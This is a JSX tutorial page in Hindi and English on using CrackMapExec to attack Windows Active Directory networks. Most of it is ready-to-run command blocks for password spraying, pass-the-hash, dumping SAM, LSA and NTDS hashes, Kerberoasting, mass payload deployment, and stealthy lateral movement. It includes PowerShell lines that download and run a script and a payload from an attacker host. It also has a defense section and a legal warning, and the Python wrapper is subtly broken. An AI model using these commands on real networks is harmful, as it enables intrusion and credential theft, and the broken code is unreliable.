import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Crackmapexec() {
  return (
    <TutorialLayout
      title="crackmapexec"
      subtitle="Windows/AD नेटवर्क्स के लिए Swiss army knife — स्कैन, ऑथ, एक्सीक्यूट"
      icon="🔪"
      prev={{ to: '/tool/impacket', label: 'impacket' }}
      next={{ to: '/tools', label: 'All Tools' }}
    >
      <h2>What is CrackMapExec?</h2>
      <p>
        CrackMapExec (CME) Windows और Active Directory नेटवर्क्स का सबसे पावरफुल पोस्ट-एक्सप्लॉइटेशन टूल है। यह SMB, WinRM, LDAP, MSSQL, SSH, RDP जैसे कई प्रोटोकॉल्स को एक ही टूल से हैंडल करता है। क्रेडेंशियल वैलिडेशन, रिमोट कमांड एक्सीक्यूशन, शेयर एन्यूमरेशन, और लैटरल मूवमेंट — सब कुछ एक ही टूल से। एक्टिव डायरेक्टरी पेनेट्रेशन टेस्टिंग में यह सबसे पहले इस्तेमाल होने वाला टूल है।
      </p>
      <p>
        CME की सबसे बड़ी खासियत बल्क टेस्टिंग है। अगर आपके पास एक यूज़रनेम-पासवर्ड है, तो CME पूरे नेटवर्क (192.168.1.0/24) पर एक साथ टेस्ट करेगा कि वो क्रेडेंशियल किस-किस मशीन पर काम करता है। [Pwn3d!] मतलब आपको उस मशीन पर एडमिन एक्सेस मिल गया। यह Impacket लाइब्रेरी पर बना है और Python में लिखा गया है।
      </p>
      <p>
        CME को byt3bl33d3r ने बनाया था और बाद में mpgn ने इसे maintain किया। यह Red Team operations का एसेंशियल टूल है — एक बार डोमेन में क्रेडेंशियल मिलने के बाद, CME से पूरे नेटवर्क पर लैटरल मूवमेंट कर सकते हो। यह Hashcat और John the Ripper के साथ भी इंटीग्रेट होता है।
      </p>
      <p>
        CME का प्लगइन सिस्टम इसे बहुत flexible बनाता है। हर प्रोटोकॉल (SMB, WinRM, LDAP, MSSQL, SSH, RDP) एक अलग module है और हर module के अंदर कई sub-commands हैं। यह Impacket के सभी tools (psexec, wmiexec, secretsdump) को एक unified interface से access करने देता है।
      </p>
      <p>
        CME v5 से प्लगइन architecture introduce हुआ जिससे custom modules बनाना आसान हो गया। आज CME/NetExec AD exploitation का industry standard tool है। Red Teamers, penetration testers, और security auditors सभी इसे daily use करते हैं।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> CrackMapExec केवल अधिकृत पेनेट्रेशन टेस्टिंग और Red Team ऑपरेशंस में ही इस्तेमाल करें। अनधिकृत नेटवर्क एक्सेस अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस में 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है।
      </div>

      <h2>History of CrackMapExec</h2>
      <p>
        CrackMapExec को 2015 में byt3bl33d3r ने बनाया था। शुरू में यह सिर्फ SMB प्रोटोकॉल सपोर्ट करता था, लेकिन समय के साथ WinRM, LDAP, MSSQL, SSH, RDP सब जोड़े गए। 2019 में CME v5 रिलीज़ हुआ जिसमें बड़ा आर्किटेक्चर चेंज हुआ — प्लगइन सिस्टम जोड़ा गया।
      </p>
      <p>
        2021 में mpgn ने इसे maintain करना शुरू किया और Impacket के साथ बेहतर इंटीग्रेशन किया। आज CME GitHub पर 8000+ stars के साथ सबसे पॉपुलर AD exploitation टूल्स में से एक है। यह NetExec (nxec) के नाम से भी जाना जाता है — newer versions में नाम बदला गया है।
      </p>
      <p>
        CME का इतिहास AD exploitation के evolution के साथ जुड़ा है। पहले अलग-अलग tools (psexec, wmiexec, secretsdump) अलग-अलग चलाने पड़ते थे। CME ने सब कुछ एक unified interface में ला दिया — यही इसकी सबसे बड़ी innovation है।
      </p>

      <h2>How CrackMapExec Works?</h2>
      <p>
        CME Impacket लाइब्रेरी का इस्तेमाल करके Windows सर्विसेज़ से बात करता है। हर प्रोटोकॉल के लिए अलग module है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SMB Module:</strong> Windows file sharing — शेयर्स, यूज़र्स, ग्रुप्स, SAM/LSA dump, PsExec, file operations</li>
        <li><strong className="text-white">WinRM Module:</strong> PowerShell remoting — रिमोट कमांड एक्सीक्यूशन, interactive shell</li>
        <li><strong className="text-white">LDAP Module:</strong> Active Directory queries — यूज़र्स, ग्रुप्स, कंप्यूटर्स, Kerberoasting, AS-REP</li>
        <li><strong className="text-white">MSSQL Module:</strong> SQL Server — xp_cmdshell, डेटाबेस queries, SQL injection</li>
        <li><strong className="text-white">SSH Module:</strong> Linux servers — रिमोट command execution, key-based auth</li>
        <li><strong className="text-white">RDP Module:</strong> Remote Desktop — NLA check, रिमोट login, screenshot</li>
        <li><strong className="text-white">VNC Module:</strong> Virtual Network Computing — remote desktop access</li>
        <li><strong className="text-white">WMI Module:</strong> Windows Management Instrumentation — system queries, remote execution</li>
      </ul>

      <h2>Installation</h2>
      <CodeBlock
        title="CrackMapExec इंस्टॉलेशन"
        code={`# pip से (सबसे आसान):
pip3 install crackmapexec

# apt से:
sudo apt update
sudo apt install crackmapexec

# Docker से:
docker run -it ly4k/crackmapexec
docker run -it ly4k/crackmapexec smb 192.168.1.0/24 -u admin -p pass

# सोर्स से:
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
cd CrackMapExec
pip3 install -e .

# NetExec (newer fork — recommended):
pip3 install netexec

# वर्जन चेक:
crackmapexec --version
crackmapexec --help

# Module list:
crackmapexec --list-modules`}
      />

      <h2>Basic Usage</h2>
      <CodeBlock
        title="क्रेडेंशियल टेस्टिंग"
        code={`# नेटवर्क पर SMB क्रेडेंशियल्स टेस्ट करें:
crackmapexec smb 192.168.1.0/24 -u admin -p password123

# [+] = वैलिड क्रेडेंशियल्स (लेकिन एडमिन नहीं)
# [Pwn3d!] = एडमिन एक्सेस मिला!
# [-] = इनवैलिड क्रेडेंशियल्स
# [*] = इन्फॉर्मेशनल

# स्पेसिफिक टार्गेट:
crackmapexec smb 192.168.1.100 -u admin -p password

# टार्गेट फाइल से:
crackmapexec smb targets.txt -u admin -p password

# पासवर्ड लिस्ट से (ब्रूटफोर्स):
crackmapexec smb 192.168.1.0/24 -u admin -p passwords.txt

# कई यूज़र्स:
crackmapexec smb target -u users.txt -p password

# डोमेन स्पेसिफाई:
crackmapexec smb target -u admin -p pass -d domain.local

# Pass-the-Hash:
crackmapexec smb target -u admin -H aad3b435b51404eeaad3b435b51404ee:HASH

# Null session (बिना क्रेडेंशियल):
crackmapexec smb target -u '' -p ''`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-u user</td><td className="py-2 px-3">यूज़रनेम (या users.txt)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p pass</td><td className="py-2 px-3">पासवर्ड (या passwords.txt)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-H hash</td><td className="py-2 px-3">NTLM हैश (Pass-the-Hash)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d domain</td><td className="py-2 px-3">डोमेन नेम</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-x cmd</td><td className="py-2 px-3">CMD कमांड एक्सीक्यूट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-X ps</td><td className="py-2 px-3">PowerShell कमांड एक्सीक्यूट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--shares</td><td className="py-2 px-3">शेयर्स लिस्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--users</td><td className="py-2 px-3">यूज़र्स एन्यूमरेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--groups</td><td className="py-2 px-3">ग्रुप्स एन्यूमरेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--sam</td><td className="py-2 px-3">SAM डेटाबेस डंप</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--lsa</td><td className="py-2 px-3">LSA सीक्रेट्स डंप</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--ntds</td><td className="py-2 px-3">NTDS.dit डंप (Domain Controller)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--kerberoast</td><td className="py-2 px-3">Kerberoastable accounts ढूंढें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--asreproast</td><td className="py-2 px-3">AS-REP Roastable accounts</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--exec-method</td><td className="py-2 px-3">Execution method (smbexec/wmiexec/atexec)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--threads N</td><td className="py-2 px-3">पैरेलल थ्रेड्स (default 1)</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--log file</td><td className="py-2 px-3">आउटपुट फाइल में सेव</td></tr>
          </tbody>
        </table>
      </div>

      <h2>SMB Module (Detailed)</h2>
      <p>
        SMB module CME का सबसे powerful और ज़्यादा इस्तेमाल होने वाला module है। यह Windows file sharing protocol का पूरा exploitation करता है।
      </p>
      <CodeBlock
        title="SMB Enumeration & Exploitation"
        code={`# शेयर्स लिस्ट करें:
crackmapexec smb target -u admin -p pass --shares

# यूज़र्स एन्यूमरेशन:
crackmapexec smb target -u admin -p pass --users

# ग्रुप्स एन्यूमरेशन:
crackmapexec smb target -u admin -p pass --groups

# पासवर्ड पॉलिसी:
crackmapexec smb target -u admin -p pass --pass-pol

# लॉग्ड-ऑन यूज़र्स:
crackmapexec smb target -u admin -p pass --loggedon-users

# लोकल एडमिन्स:
crackmapexec smb target -u admin -p pass --local-admins

# SAM डंप (लोकल पासवर्ड हैशेस):
crackmapexec smb target -u admin -p pass --sam

# LSA सीक्रेट्स:
crackmapexec smb target -u admin -p pass --lsa

# NTDS.dit डंप (Domain Controller से):
crackmapexec smb dc01 -u admin -p pass --ntds

# NTDS vss method:
crackmapexec smb dc01 -u admin -p pass --ntds vss

# शेयर पर फाइल सर्च (spider_plus module):
crackmapexec smb target -u admin -p pass -M spider_plus

# डिस्क शेयर माउंट करें:
crackmapexec smb target -u admin -p pass --disk

# SMB signing check:
crackmapexec smb target --gen-relay-list relay_list.txt

# Pass-the-Hash:
crackmapexec smb target -u admin -H NTHASH`}
      />

      <h2>WinRM Module</h2>
      <CodeBlock
        title="WinRM Exploitation"
        code={`# WinRM से क्रेडेंशियल टेस्ट:
crackmapexec winrm 192.168.1.0/24 -u admin -p pass

# WinRM से कमांड एक्सीक्यूट:
crackmapexec winrm target -u admin -p pass -x whoami

# PowerShell कमांड:
crackmapexec winrm target -u admin -p pass -X "Get-Process"

# PowerShell स्क्रिप्ट रन करें:
crackmapexec winrm target -u admin -p pass -X "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

# Pass-the-Hash:
crackmapexec winrm target -u admin -H aad3b435b51404eeaad3b435b51404ee:HASH

# Interactive shell (Evil-WinRM style):
crackmapexec winrm target -u admin -p pass -X "whoami; hostname; ipconfig"

# File upload via PowerShell:
crackmapexec winrm target -u admin -p pass -X "Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile C:\\temp\\payload.exe"`}
      />

      <h2>LDAP Module</h2>
      <CodeBlock
        title="AD Enumeration via LDAP"
        code={`# LDAP से यूज़र्स एन्यूमरेशन:
crackmapexec ldap target -u admin -p pass --users

# ग्रुप्स:
crackmapexec ldap target -u admin -p pass --groups

# कंप्यूटर्स:
crackmapexec ldap target -u admin -p pass --computers

# पासवर्ड पॉलिसी:
crackmapexec ldap target -u admin -p pass --pass-pol

# डोमेन ट्रस्ट्स:
crackmapexec ldap target -u admin -p pass --trusted-for-delegation

# Kerberoastable अकाउंट्स:
crackmapexec ldap target -u admin -p pass --kerberoast kerberoast.txt

# AS-REP Roastable अकाउंट्स:
crackmapexec ldap target -u admin -p pass --asreproast asrep.txt

# BloodHound data collection:
crackmapexec ldap target -u admin -p pass --bloodhound --collection All

# Admin Count users (privileged accounts):
crackmapexec ldap target -u admin -p pass --admin-count

# Delegation info:
crackmapexec ldap target -u admin -p pass --trusted-for-delegation`}
      />

      <h2>MSSQL Module</h2>
      <CodeBlock
        title="SQL Server Exploitation"
        code={`# MSSQL क्रेडेंशियल टेस्ट:
crackmapexec mssql target -u sa -p password

# कमांड एक्सीक्यूट (xp_cmdshell):
crackmapexec mssql target -u sa -p pass -x whoami

# PowerShell:
crackmapexec mssql target -u sa -p pass -X "Get-Process"

# डेटाबेस लिस्ट:
crackmapexec mssql target -u sa -p pass --dbs

# टेबल्स:
crackmapexec mssql target -u sa -p pass --tables

# SQL क्वेरी:
crackmapexec mssql target -u sa -p pass -q "SELECT @@version"

# SQL क्वेरी (multiple):
crackmapexec mssql target -u sa -p pass -q "SELECT name FROM master.dbo.sysdatabases"

# Bulk MSSQL testing:
crackmapexec mssql 192.168.1.0/24 -u sa -p password`}
      />

      <h2>SSH Module</h2>
      <CodeBlock
        title="SSH Exploitation"
        code={`# SSH क्रेडेंशियल टेस्ट:
crackmapexec ssh target -u root -p password

# नेटवर्क बल्क टेस्ट:
crackmapexec ssh 192.168.1.0/24 -u admin -p pass

# कमांड एक्सीक्यूट:
crackmapexec ssh target -u admin -p pass -x whoami

# की-बेस्ड auth:
crackmapexec ssh target -u admin --key-file /path/to/key

# कई कमांड्स:
crackmapexec ssh target -u admin -p pass -x "uname -a && id && cat /etc/passwd"`}
      />

      <h2>Credential Spraying</h2>
      <p>
        क्रेडेंशियल स्प्रेइंग में एक पासवर्ड को कई अकाउंट्स पर टेस्ट करते हैं। यह password spraying attack है — account lockout से बचने का best तरीका।
      </p>
      <CodeBlock
        title="Credential Spraying"
        code={`# एक पासवर्ड से पूरा नेटवर्क:
crackmapexec smb 192.168.1.0/24 -u users.txt -p Summer2024!

# कई पासवर्ड्स:
crackmapexec smb 192.168.1.0/24 -u admin -p passwords.txt

# डोमेन क्रेडेंशियल्स:
crackmapexec smb 192.168.1.0/24 -u admin -p pass -d corp.local

# रिजल्ट फ़ाइल में सेव:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --log results.txt

# पैरेलल थ्रेड्स (तेज़):
crackmapexec smb targets.txt -u admin -p pass --threads 10

# Continuous spray (हर 30 मिनट में):
while true; do
  crackmapexec smb 192.168.1.0/24 -u users.txt -p "Winter2024!"
  sleep 1800
done

# केवल valid results दिखाओ:
crackmapexec smb 192.168.1.0/24 -u admin -p pass | grep "+"`}
      />

      <h2>Password Hash Dumping</h2>
      <CodeBlock
        title="SAM/LSA/NTDS Dump"
        code={`# SAM डंप (लोकल अकाउंट हैशेस):
crackmapexec smb target -u admin -p pass --sam

# LSA सीक्रेट्स (डोमेन क्रेडेंशियल्स):
crackmapexec smb target -u admin -p pass --lsa

# NTDS.dit डंप (सभी डोमेन हैशेस):
crackmapexec smb dc01.target.local -u DAadmin -p pass --ntds

# NTDS डंप (vss method):
crackmapexec smb dc01 -u admin -p pass --ntds vss

# डंप सेव करें:
crackmapexec smb target -u admin -p pass --sam --log sam_dump.txt

# Mimikatz स्टाइल डंप:
crackmapexec smb target -u admin -p pass -M mimikatz

# DPAPI secrets:
crackmapexec smb target -u admin -p pass -M dpapi_hash

# LSASS dump:
crackmapexec smb target -u admin -p pass -M lsassy

# Hash dump + crack workflow:
# Step 1: Dump hashes
crackmapexec smb dc01 -u DA -p pass --ntds > ntds_dump.txt
# Step 2: Extract only hashes
cat ntds_dump.txt | awk -F: '{print $4}' > hashes.txt
# Step 3: Crack with Hashcat
hashcat -m 1000 hashes.txt rockyou.txt`}
      />

      <h2>Lateral Movement</h2>
      <CodeBlock
        title="PsExec, WMIExec, AtExec, SMBExec"
        code={`# PsExec (सबसे common — सबसे noisy):
crackmapexec smb target -u admin -p pass -x whoami
# Default method = smbexec

# WMIExec (कम stealthy):
crackmapexec smb target -u admin -p pass -x whoami --exec-method wmiexec

# AtExec (scheduled task):
crackmapexec smb target -u admin -p pass -x whoami --exec-method atexec

# SMBExec:
crackmapexec smb target -u admin -p pass -x whoami --exec-method smbexec

# DCOM execution:
crackmapexec smb target -u admin -p pass -x whoami --exec-method dcomexec

# सभी मशीन्स पर पेलोड ड्रॉप:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --put-file payload.exe C:\\temp\\payload.exe

# सभी मशीन्स पर पेलोड रन:
crackmapexec smb 192.168.1.0/24 -u admin -p pass -x "C:\\temp\\payload.exe"

# सभी मशीन्स से फाइल डाउनलोड:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --get-file C:\\Windows\\System32\\drivers\\etc\\hosts ./hosts/

# Lateral movement chain:
# Step 1: Find admin access
crackmapexec smb 192.168.1.0/24 -u user -p pass
# Step 2: Dump hashes from [Pwn3d!] machines
crackmapexec smb target -u user -p pass --sam
# Step 3: Use new hashes
crackmapexec smb 192.168.1.0/24 -u admin -H NEW_HASH
# Step 4: Repeat until Domain Admin`}
      />

      <h2>Kerberoasting & AS-REP</h2>
      <CodeBlock
        title="Kerberos Attacks"
        code={`# Kerberoastable अकाउंट्स ढूंढें:
crackmapexec ldap target -u admin -p pass --kerberoast output.txt

# AS-REP Roastable:
crackmapexec ldap target -u admin -p pass --asreproast output.txt

# Hashcat से क्रैक करें:
# Kerberoast (TGS-REP):
hashcat -m 13100 output.txt rockyou.txt
# AS-REP:
hashcat -m 18200 output.txt rockyou.txt

# Delegation info:
crackmapexec ldap target -u admin -p pass --trusted-for-delegation

# Admin access से डायरेक्ट Kerberoast:
crackmapexec smb target -u admin -p pass --kerberoast

# Unconstrained delegation:
crackmapexec ldap target -u admin -p pass --trusted-for-delegation

# Constrained delegation:
crackmapexec ldap target -u admin -p pass --constrained-delegation`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated AD Pentesting"
        code={`#!/bin/bash
# AD Pentest Automation Script

TARGET="192.168.1.0/24"
USER="admin"
PASS="password123"
DOMAIN="corp.local"

echo "[+] स्टेप 1: SMB Scan"
crackmapexec smb $TARGET -u $USER -p $PASS -d $DOMAIN > smb_results.txt

echo "[+] स्टेप 2: Shares Enum"
crackmapexec smb $TARGET -u $USER -p $PASS --shares > shares.txt

echo "[+] स्टेप 3: Users Enum"
crackmapexec ldap $TARGET -u $USER -p $PASS --users > users.txt

echo "[+] स्टेप 4: Groups"
crackmapexec ldap $TARGET -u $USER -p $PASS --groups > groups.txt

echo "[+] स्टेप 5: Kerberoast"
crackmapexec ldap $TARGET -u $USER -p $PASS --kerberoast kerberoast.txt

echo "[+] स्टेप 6: Password Policy"
crackmapexec smb $TARGET -u $USER -p $PASS --pass-pol > passpol.txt

echo "[+] स्टेप 7: SAM Dump (Pwn3d machines)"
grep "Pwn3d" smb_results.txt | awk '{print $5}' | while read host; do
  crackmapexec smb $host -u $USER -p $PASS --sam > "sam_$host.txt"
done

echo "[+] डन! रिजल्ट्स फाइल्स में हैं"`}
      />

      <CodeBlock
        title="Python Automation Script"
        code={`#!/usr/bin/env python3
# CME Python wrapper — automated exploitation

import subprocess
import sys

def run_cme(target, user, password, domain=""):
    cmd = f"crackmapexec smb {target} -u {user} -p {password}"
    if domain:
        cmd += f" -d {domain}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

def find_pwned(output):
    pwned = []
    for line in output.split("\\n"):
        if "Pwn3d" in line:
            host = line.split(" ")[[4]]
            pwned.append(host)
    return pwned

# Step 1: Scan network
output = run_cme("192.168.1.0/24", "admin", "password123")
print("[+] Scan Results:")
print(output)

# Step 2: Find pwned machines
pwned = find_pwned(output)
print(f"[+] Pwned machines: {pwned}")

# Step 3: Dump SAM from pwned machines
for host in pwned:
    print(f"[+] Dumping SAM from {host}")
    sam = run_cme(host, "admin", "password123")
    print(sam)`}
      />

      <h2>CME vs Impacket vs Evil-WinRM</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">CrackMapExec</th>
              <th className="text-left py-2 px-3 text-neon-green">Impacket</th>
              <th className="text-left py-2 px-3 text-neon-green">Evil-WinRM</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Bulk Testing</td><td className="py-2 px-3">हाँ (पूरा /24)</td><td className="py-2 px-3">नहीं (एक-एक)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Protocols</td><td className="py-2 px-3">SMB/WinRM/LDAP/MSSQL/SSH/RDP</td><td className="py-2 px-3">SMB/LDAP/Kerberos</td><td className="py-2 px-3">WinRM only</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SAM/NTDS Dump</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (secretsdump)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Lateral Movement</td><td className="py-2 px-3">PsExec/WMI/At/SMB/DCOM</td><td className="py-2 px-3">PsExec/WMI/DCOM</td><td className="py-2 px-3">WinRM only</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">File Transfer</td><td className="py-2 px-3">हाँ (put/get)</td><td className="py-2 px-3">हाँ (smbclient)</td><td className="py-2 px-3">हाँ (upload/download)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Kerberoasting</td><td className="py-2 px-3">हाँ (built-in)</td><td className="py-2 px-3">हाँ (GetUserSPNs)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">BloodHound</td><td className="py-2 px-3">हाँ (module)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Interactive Shell</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (psexec)</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Plugins</td><td className="py-2 px-3">हाँ (mimikatz, lsassy)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">बहुत आसान</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">आसान</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: '[+] दिख रहा है लेकिन [Pwn3d!] नहीं', a: '[+] मतलब क्रेडेंशियल सही है लेकिन एडमिन एक्सेस नहीं है। --local-admins flag से चेक करो कि यूज़र लोकल एडमिन है या नहीं।' },
          { q: 'NTDS dump fail हो रहा है', a: 'Domain Admin क्रेडेंशियल्स चाहिए। --ntds vss method try करो। VSS service enable होना चाहिए DC पर। Disk space भी check करो।' },
          { q: 'PsExec काम नहीं कर रहा', a: 'SMB signing enabled हो सकता है। --exec-method wmiexec try करो। Firewall port 445 block हो सकता है। Admin share (C$) accessible होना चाहिए।' },
          { q: 'LDAP connection fail', a: 'DNS resolution check करो। -d domain.local से डोमेन स्पेसिफाई करो। LDAP port 389 open होना चाहिए। GC port 3268 भी try करो।' },
          { q: 'Kerberoast output empty', a: 'SPN set अकाउंट्स नहीं मिले। LDAP module use करो: crackmapexec ldap target -u user -p pass --kerberoast। Domain user credentials चाहिए।' },
          { q: 'Permission denied on shares', a: 'क्रेडेंशियल सही है लेकिन share access नहीं है। दूसरा अकाउंट try करो या --shares से permissions check करो।' },
          { q: 'CME slow है /24 scan में', a: '--threads 20 से बढ़ाओ। --timeout 5 से timeout कम करो। Specific targets use करो पूरे subnet की जगह।' },
          { q: 'Pass-the-Hash काम नहीं कर रहा', a: 'Hash format check करो: NTHASH या LMHASH:NTHASH। NTLMv2 hash होना चाहिए। SMB signing issue हो सकता है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Active Directory Pentesting Methodology</h2>
      <p>
        CME-based AD pentesting एक systematic methodology follow करनी चाहिए। हर phase important है — structured approach से कोई attack vector miss नहीं होगा। यह methodology industry-standard Red Team operations पर based है।
      </p>
      <p>
        <strong className="text-white">Phase 1 — Enumeration:</strong> पहले network layout समझो। CME से SMB scan करो — कौन सी machines alive हैं, कौन से services चल रहे हैं। LDAP module से users, groups, computers enumerate करो। Domain trusts check करो। BloodHound data collect करो — attack paths visualize होंगे।
      </p>
      <p>
        <strong className="text-white">Phase 2 — Credential Access:</strong> अगर credentials मिले हैं तो CME से validate करो — किस-किस machine पर काम करते हैं। Password spraying करो — common passwords test करो। Kerberoastable और AS-REP Roastable accounts ढूंढो। Hashcat से cracked passwords use करो।
      </p>
      <p>
        <strong className="text-white">Phase 3 — Lateral Movement:</strong> [Pwn3d!] machines पर SAM/LSA dump करो — new credentials मिलेंगे। नए credentials से दोबारा CME चलाओ — chain बनती जाएगी। PsExec, WMIExec, AtExec methods try करो। File transfer से payloads deploy करो।
      </p>
      <p>
        <strong className="text-white">Phase 4 — Privilege Escalation:</strong> Domain Admin credentials ढूंढो। NTDS.dit dump करो — सभी domain hashes मिलेंगे। Kerberoast से SPN account passwords crack करो। Unconstrained/Constrained delegation abuse करो। Domain Controller access लो।
      </p>
      <p>
        <strong className="text-white">Phase 5 — Persistence:</strong> Golden Ticket बनाओ (krbtgt hash से)। Skeleton Key inject करो। New admin accounts बनाओ। GPO modify करो। Scheduled tasks set करो। यह सब authorized testing में ही करो — report में document करो।
      </p>

      <h2>Detection and Defense</h2>
      <p>
        CME attacks से कैसे बचें:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SMB Signing Enable:</strong> सभी Windows मशीन्स पर SMB signing enforce करें — relay attacks रुकेंगे</li>
        <li><strong className="text-white">LAPS Deploy:</strong> Local Administrator Password Solution — हर मशीन का अलग local admin password</li>
        <li><strong className="text-white">WinRM Restrict:</strong> WinRM सिर्फ ज़रूरी मशीन्स पर enable रखें, GPO से restrict करें</li>
        <li><strong className="text-white">Privileged Access:</strong> Domain Admin क्रेडेंशियल्स PAW (Privileged Access Workstation) से ही इस्तेमाल करें</li>
        <li><strong className="text-white">Monitoring:</strong> Event ID 4624/4625 (logons), 5140/5145 (SMB access) monitor करें</li>
        <li><strong className="text-white">Kerberoast Mitigation:</strong> Strong SPN passwords (25+ chars), Group Managed Service Accounts (gMSA) use करें</li>
        <li><strong className="text-white">AS-REP Mitigation:</strong> "Do not require Kerberos preauthentication" disable रखें</li>
        <li><strong className="text-white">Network Segmentation:</strong> Admin VLAN अलग रखें, lateral movement रोकें</li>
        <li><strong className="text-white">EDR Solutions:</strong> CrowdStrike, Defender for Endpoint — PsExec/WMIExec detect करते हैं</li>
        <li><strong className="text-white">Honey Tokens:</strong> Fake admin accounts बनाओ — जब CME उन्हें use करे तो alert आए</li>
        <li><strong className="text-white">Credential Guard:</strong> Windows Credential Guard enable करो — LSASS memory protection मिलेगी</li>
        <li><strong className="text-white">LAPS Deployment:</strong> Local Admin Password Solution deploy करो — हर machine का local admin password different होगा</li>
        <li><strong className="text-white">Just Enough Admin (JEA):</strong> PowerShell JEA implement करो — admin tasks के लिए minimum privileges</li>
      </ul>

      <h2>CME for Red Team Operations</h2>
      <p>
        Red Team operations में CME essential tool है। यह methodology industry-standard approach है जो professional Red Teams follow करते हैं। CME से network enumeration, credential validation, lateral movement, और persistence — सब कुछ एक tool से।
      </p>
      <p>
        Red Team engagement में CME को stealth mode में use करो। --exec-method wmiexec less detectable है PsExec से। Commands background में execute होते हैं — no interactive shell means less suspicious activity। Time-based execution — business hours के बाद operations करो। Traffic patterns mimic करो — normal admin activity जैसा दिखना चाहिए।
      </p>
      <p>
        CME का output carefully analyze करो। [Pwn3d!] machines priority targets हैं — इनसे SAM/LSA dump करो। Shares enumerate करो — sensitive files (passwords.txt, backup, scripts) search करो। Users list करो — privileged accounts identify करो। Domain policies check करो — password complexity, lockout policy, account expiration।
      </p>
      <p>
        Red Team reports में CME findings document करो। हर [Pwn3d!] machine का impact describe करो — क्या access मिला, क्या data accessible है। Attack chain visualize करो — initial access → lateral movement → domain admin। Recommendations specific रखो — which machines to patch, which credentials to rotate, which services to restrict।
      </p>

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="AD Lab Setup"
        code={`# VirtualBox में AD Lab:
# 1. Windows Server 2019 VM (Domain Controller)
# 2. Windows 10/11 VM (Domain Member)
# 3. Kali Linux VM (Attacker)

# DC Setup:
Install-WindowsFeature AD-Domain-Services
Install-ADDSForest -DomainName corp.local

# कुछ यूज़र्स बनाओ:
New-ADUser -Name "TestUser" -SamAccountName testuser
Set-ADAccountPassword -Identity testuser -NewPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force)
Enable-ADAccount -Identity testuser

# SPN set (Kerberoasting practice):
setspn -A HTTP/web01.corp.local svcaccount

# अपने लैब में CME test करो:
